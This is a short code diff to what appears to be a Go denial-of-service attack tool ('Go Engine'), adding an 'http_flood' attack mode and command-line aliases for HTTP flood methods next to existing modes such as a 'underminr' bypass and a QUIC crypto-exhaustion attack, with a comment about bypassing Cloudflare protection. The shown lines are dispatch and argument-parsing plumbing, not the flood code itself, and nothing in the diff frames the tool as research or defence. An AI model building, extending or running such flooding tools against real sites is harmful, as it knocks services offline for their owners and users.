@@ -94,6 +94,8 @@ func Main() {
 		runUnderminrBypass(cfg)
 	case "http_flood_enhanced":
 		runHTTPFloodEnhanced(cfg)
+	case "http_flood":
+		runHTTPFlood(cfg)
 	default:
 		// Use enhanced version by default for better Cloudflare bypass
 		runHTTPFloodEnhanced(cfg)
@@ -175,7 +177,7 @@ func outputResult() {
 
 func parseArgs() *AttackConfig {
 	if len(os.Args) < 3 {
-		fmt.Println(`Go Engine v` + Version + `
+		fmt.Print(`Go Engine v` + Version + `
 Usage: go_engine.exe -target URL -method METHOD [options]
 
 Required:
@@ -256,6 +258,10 @@ Options:
 					cfg.MethodType = "quic_crypto_exhaust"
 				case "underminr":
 					cfg.MethodType = "underminr"
+				case "http-flood":
+					cfg.MethodType = "http_flood"
+				case "http-flood-enhanced":
+					cfg.MethodType = "http_flood_enhanced"
 				default:
 					cfg.MethodType = "http_flood"
 				}
